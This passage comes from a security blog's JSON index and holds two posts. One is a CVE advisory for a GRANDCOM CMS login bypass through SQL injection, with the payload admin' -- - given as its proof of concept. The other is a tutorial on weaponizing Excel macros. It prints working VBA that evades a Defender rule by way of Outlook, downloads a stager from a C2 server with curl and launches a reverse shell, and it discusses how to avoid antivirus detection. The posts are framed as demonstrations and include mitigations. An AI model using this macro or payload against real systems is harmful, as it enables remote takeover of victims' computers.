Server"},{"content":"Vulnerability Summary A SQL injection vulnerability in the Content Management System provided by GRANDCOM, s.r.o., version 4.2 and older, allows remote unauthenticated attackers to bypass authentication via a crafted username during a login attempt. Any unauthorized user with access to the application is able to exploit this vulnerability.\nA SQL Injection attack consists of inserting an SQL query through input data from the client into the application. Upon successful exploitation, it is possible to retrieve detailed data from the database, edit database data such as inserting, updating, or deleting records, perform administrative operations, or in some cases, execute commands directly on the operating system.\nCVSS v3.1 Metrics Metric Value Base Score 9.8 (CRITICAL) Vector CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H Weakness Enumeration CWE ID Description CWE-89 Improper Neutralization of Special Elements used in an SQL Command (\u0026lsquo;SQL Injection\u0026rsquo;) Proof of Concept (PoC) Steps to Reproduce Visit the following resource: /admin/index.php Enter the following credentials: Username: admin' -- - Password: any value Press the Login button. This results in a successful authentication bypass.\nSuggested Mitigations Use of prepared statements (with parameterized queries). Use of stored procedures. Allow-list input validation. Escape all user-supplied input. References https://www.grandcom.sk/ https://www.cve.org/CVERecord?id=CVE-2021-37413 https://nvd.nist.gov/vuln/detail/CVE-2021-37413 https://portswigger.net/web-security/sql-injection https://portswigger.net/support/using-sql-injection-to-bypass-authentication ","permalink":"https://martinkubecka.sk/security-advisories/cve-2021-37413/","summary":"Vulnerability Summary A SQL injection vulnerability in the Content Management System provided by GRANDCOM, s.r.o., version 4.2 and older, allows remote unauthenticated attackers to bypass authentication via a crafted username during a login attempt. Any unauthorized user with access to the application is able to exploit this vulnerability.\nA SQL Injection attack consists of inserting an SQL query through input data from the client into the application. Upon successful exploitation, it is possible to retrieve detailed data from the database, edit database data such as inserting, updating, or deleting records, perform administrative operations, or in some cases, execute commands directly on the operating system.","title":"CVE-2021-37413: Authentication Bypass in Content Management System Provided by GRANDCOM, s.r.o."},{"content":"Introduction Microsoft Excel is a very useful program that makes life easier for millions of people and companies around the world. It is a robust tool for data collection and visualization, creation of calculations and more. Unfortunately, software that offers script-based automation capabilities also has its downsides.\nA macro is a script that is used to automate tasks in Excel documents, e.g. calculations. Because macros are part of an Excel document and can run automatically, they are a good tool for an attacker to control a computer.\nMacros are written in the VBA (Visual Basic) scripting language, which can work with the system application interface from a privileged context (MS Excel), thanks to which it allows good interaction with the operating system. Script execution is configurable according to events that occur based on user action\nAutoExec : Launches when a document is opened AutoNew : Launches when a new document is created AutoOpen : Launches when an existing document is opened AutoClose : Launches when the document is closed where the event triggers malicious code. When malicious code starts executing, the attacker will be able to work with Win32 API, COM objects, VBA code, or it is possible to invoke the loading of their own library.\nAs macro security went unnoticed, Microsoft and other security companies began working on protection mechanisms.\nOne of these protection mechanisms, which is implemented directly in MS Excel, is that macros do not run automatically when a dangerous document is opened.\nAs a result, social engineering methods have begun to be used to force the user to allow the use of macros.\nOne way, for example, might be to make the document look encrypted and ask the user to enable the macro for security reasons. There are no limits to creativity.\nCreating a Malicious Macro Macros can be enabled, but we need an entry point for our malicious program. After macros are enabled, we can proceed to the actual execution of the code. Before describing the technical details, the following infographic accurately describes our process of infecting a computer and taking complete control of it.\nOur event handlers can be registered simply by giving the procedure the same name as the event we want to run, or by naming one of our code modules after the automatic macro and including the procedure in that module.\nIn addition to these application events, the Office documents themselves trigger various events and may contain their own utilities. These event handling procedures are contained in the document instead of in the code module. In our code, we use the Workbook_Open event, which starts when a document is opened.\nPrivate Sub Workbook_Open() AutoRunMacroBypassDownload End Sub This event is executed by a service code located in a separate Module. If we want to create a Shell instance, a rule from MS Defender will block our request. Specifically, Microsoft states the following in its documentation:\nThe rule blocks Office applications from creating child processes. Office applications include Word, Excel, PowerPoint, OneNote and Access. Creating malicious child processes is a common malware strategy. Malware that abuses Office as a vector often runs VBA macros and uses code to download and run additional code.\nWe can notice that the documents do not include Outlook, which we use to create a Shell object and bypass the rule from MS Defender. Then we execute a GET request to the Command and Control Server (also known as C2 or C\u0026amp;C), from where we download a stager that contains an application called Client, which establishes a TCP connection to the C2 server.\nWe decided to compile our own reverse shell written in C# for two main reasons. First of all, it is important to realize that both attackers and antivirus developers have access to programs such as Metasploit and Empire. For this reason, generated reverse shell binaries, whether after obfuscation or injected into a legitimate application, are marked as malicious based on a fingerprint.\nThe second reason is that once we insert any PowerShell cmdlets into a macro, the file is always marked as malicious and Windows Defender removes it as soon as it is created.\n\u0026#39; Bypass defender chiled process protection using outlook process Sub AutoRunMacroBypassDownload() \u0026#39; create outlook object Set objOL = CreateObject(\u0026#34;Outlook.Application\u0026#34;) \u0026#39; create shell object under the outlook object Set WshShell = objOL.CreateObject(\u0026#34;Wscript.Shell\u0026#34;) \u0026#39; exec the command from the new shell object \u0026#39; download stager Set WshShellExec = WshShell.Exec(\u0026#34;curl http://\u0026lt;SERVER IP\u0026gt;:\u0026lt;SERVER PORT\u0026gt;/stager.zip --output C:\\Users\\Public\\Documents\\stager.zip\u0026#34;) Application.Wait (Now + TimeValue(\u0026#34;00:00:03\u0026#34;)) \u0026#39; unzip stager content Call UnzipAFile(\u0026#34;C:\\Users\\Public\\Documents\\stager.zip\u0026#34;, \u0026#34;C:\\Users\\Public\\Documents\\\u0026#34;) Application.Wait (Now + TimeValue(\u0026#34;00:00:03\u0026#34;)) \u0026#39; execute encoded reverse shell Set WshShellExec = WshShell.Exec(\u0026#34;C:\\Users\\Public\\Documents\\Shell.exe\u0026#34;) End Sub Sub UnzipAFile(zippedFileFullName As Variant, unzipToPath As Variant) Dim ShellApp As Object \u0026#39;Copy the files \u0026amp; folders from the zip into a folder Set ShellApp = CreateObject(\u0026#34;Shell.Application\u0026#34;) ShellApp.Namespace(unzipToPath).CopyHere ShellApp.Namespace(zippedFileFullName).items End Sub After launching the Client application, we have gained control over the device and we can proceed with enumeration and subsequent eventual exploitation.\nIn the real world, it would be appropriate to obfuscate our macro as well as the application for establishing a TCP connection, but since this is a demonstration program, this process was not necessary.\nStatic analysis Excel document In the picture above, we can see that apart from Kaspersky antivirus, another relevant antivirus program did not detect that it was a malicious document.\nTCP Client In the case of an application that establishes a TCP connection, this is mainly detected by Microsoft Defender. In 2019, this method was marked as undetectable, but we assume that due to its exposure, MS Defender has recently started to focus on it. Another option would be to use appropriate code obfuscation or write this client in a C++ programming language.\nReal World Examples The use of VBA macros to spread viruses has existed since the creation of VBA itself (1993). This method ceased to be used around the year 2000 because simpler and more reliable methods were found to infect a computer.\nMacros in Office applications began to be abused again in 2012, mainly to collect system information such as IP address, installed applications or running system processes.\nMacro abuse erupted in 2016, when attackers were able to use macros to infect the systems with Cerber ransomware.\nAnother known abuse of macros was in 2019, when attackers used macros to invoke Powershell, which downloaded and launched malware. It was a GandCrab ransomware and a Ursnif Trojan horse aimed at filtering data from the system.\nAlso in 2021, the mentioned Ursnif malware continues to be spread. The target of the attack were Italian banks, of which about 100 were successfully infected. Its attempt was to steal the login details, which were then sent using imitation of Zoom or Webex calls.\nMitigations Globally disable macros for Microsoft Office applications. (Enable or disable macros) Do not open suspicious emails or suspicious attachments. Do not open untrusted .xlsm, .docm, .pptm documents. Delete any emails from unknown people or with suspicious content. Do not use an Administrator account for daily tasks on Windows operating system. Update Windows and antivirus regularly. Back up your documents regularly. Enterprises can prevent macro malware from running executable content using ASR rules. Resources Malicious Macros\nhttps://www.trustedsec.com/blog/malicious-macros-for-script-kiddies/ Macro Malware\nhttps://docs.microsoft.com/en-us/windows/security/threat-protection/intelligence/macro-malware MS Excel Weaponization Techniques\nhttps://bank-security.medium.com/ms-excel-weaponization-techniques-79ac51610bf5 Watch Hackers Craft Malicious Office Macros\nhttps://youtu.be/e2icQFxhp3w Real World Examples\nhttps://thehackernews.com/search/label/macros Source code for TCP client\nhttps://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc Thank you for reading and we hope you learned something new.\n","permalink":"https://martinkubecka.sk/posts/2021-05-12-malicious-macros/","summary":"Introduction Microsoft Excel is a very useful program that makes life easier for millions of people and companies around the world. It is a robust tool for data collection and visualization, creation of calculations and more. Unfortunately, software that offers script-based automation capabilities also has its downsides.\nA macro is a script that is used to automate tasks in Excel documents, e.g. calculations. Because macros are part of an Excel document and can run automatically, they are a good tool for an attacker to control a computer.","title":"Weaponizing Malicious Macros"}]